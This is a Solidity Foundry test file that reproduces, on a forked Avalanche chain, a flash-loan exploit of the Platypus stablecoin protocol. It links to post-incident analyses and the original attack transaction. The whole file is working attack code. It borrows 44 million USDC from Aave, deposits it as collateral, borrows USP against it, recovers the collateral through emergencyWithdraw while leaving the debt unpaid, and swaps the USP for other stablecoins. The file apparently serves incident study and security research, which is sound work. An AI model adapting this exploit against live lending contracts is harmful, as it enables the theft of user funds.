// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analsis
// https://twitter.com/peckshield/status/1626367531480125440
// https://twitter.com/spreekaway/status/1626319585040338953
// @TX
// https://snowtrace.io/tx/0x1266a937c2ccd970e5d7929021eed3ec593a95c68a99b4920c2efa226679b430

interface PlatypusPool {
    function deposit(address token, uint256 amount, address to, uint256 deadline) external;
    function withdraw(address token, uint256 liquidity, uint256 minimumAmount, address to, uint256 deadline) external;
    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minimumToAmount,
        address to,
        uint256 deadline
    ) external;
}

interface MasterPlatypusV4 {
    function deposit(uint256 _pid, uint256 _amount) external;
    function emergencyWithdraw(uint256 _pid) external;
}

interface PlatypusTreasure {
    struct PositionView {
        uint256 collateralAmount;
        uint256 collateralUSD;
        uint256 borrowLimitUSP;
        uint256 liquidateLimitUSP;
        uint256 debtAmountUSP;
        uint256 debtShare;
        uint256 healthFactor; // `healthFactor` is 0 if `debtAmountUSP` is 0
        bool liquidable;
    }

    function positionView(address _user, address _token) external view returns (PositionView memory);
    function borrow(address _token, uint256 _borrowAmount) external;
}

contract ContractTest is Test {
    IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IERC20 USP = IERC20(0xdaCDe03d7Ab4D81fEDdc3a20fAA89aBAc9072CE2);
    IERC20 USDC_E = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    IERC20 USDT = IERC20(0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7);
    IERC20 USDT_E = IERC20(0xc7198437980c041c805A1EDcbA50c1Ce5db95118);
    IERC20 BUSD = IERC20(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    IERC20 DAI_E = IERC20(0xd586E7F844cEa2F87f50152665BCbc2C279D8d70);
    IERC20 LPUSDC = IERC20(0xAEf735B1E7EcfAf8209ea46610585817Dc0a2E16);
    PlatypusPool Pool = PlatypusPool(0x66357dCaCe80431aee0A7507e2E361B7e2402370);
    MasterPlatypusV4 Master = MasterPlatypusV4(0xfF6934aAC9C94E1C39358D4fDCF70aeca77D0AB0);
    PlatypusTreasure Treasure = PlatypusTreasure(0x061da45081ACE6ce1622b9787b68aa7033621438);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("Avalanche", 26_343_613);
        cheats.label(address(USDC), "USDC");
        cheats.label(address(USP), "USP");
        cheats.label(address(USDC_E), "USDC_E");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(USDT_E), "USDT_E");
        cheats.label(address(BUSD), "BUSD");
        cheats.label(address(DAI_E), "DAI_E");
        cheats.label(address(LPUSDC), "LPUSDC");
        cheats.label(address(Pool), "Pool");
        cheats.label(address(Master), "Master");
        cheats.label(address(Treasure), "Treasure");
        cheats.label(address(aaveV3), "aaveV3");
    }

    function testExploit() external {
        aaveV3.flashLoanSimple(address(this), address(USDC), 44_000_000 * 1e6, new bytes(0), 0);

        emit log_named_decimal_uint("Attacker USP balance after exploit", USP.balanceOf(address(this)), USP.decimals());
        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker USDC_E balance after exploit", USDC_E.balanceOf(address(this)), USDC_E.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker USDT_E balance after exploit", USDT_E.balanceOf(address(this)), USDT_E.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), BUSD.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker DAI_E balance after exploit", DAI_E.balanceOf(address(this)), DAI_E.decimals()
        );
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initator,
        bytes calldata params
    ) external returns (bool) {
        USDC.approve(address(aaveV3), amount + premium);
        USDC.approve(address(Pool), amount);
        Pool.deposit(address(USDC), amount, address(this), block.timestamp); // deposit USDC to LP-USDC
        uint256 LPUSDCAmount = LPUSDC.balanceOf(address(this));
        LPUSDC.approve(address(Master), LPUSDCAmount);
        Master.deposit(4, LPUSDCAmount); // deposit LP-USDC to MasterPlatypus
        PlatypusTreasure.PositionView memory Position = Treasure.positionView(address(this), address(LPUSDC));
        uint256 borrowAmount = Position.borrowLimitUSP;
        Treasure.borrow(address(LPUSDC), borrowAmount); // borrow USP from Treasure
        Master.emergencyWithdraw(4);
        LPUSDC.approve(address(Pool), LPUSDC.balanceOf(address(this)));
        Pool.withdraw(address(USDC), LPUSDC.balanceOf(address(this)), 0, address(this), block.timestamp); // withdraw USDC from LP-USDC
        swapUSPToOtherToken();
        return true;
    }

    function swapUSPToOtherToken() internal {
        USP.approve(address(Pool), 9_000_000 * 1e18);
        Pool.swap(address(USP), address(USDC), 2_500_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(USDC_E), 2_000_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(USDT), 1_600_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(USDT_E), 1_250_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(BUSD), 700_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(DAI_E), 700_000 * 1e18, 0, address(this), block.timestamp);
    }
}
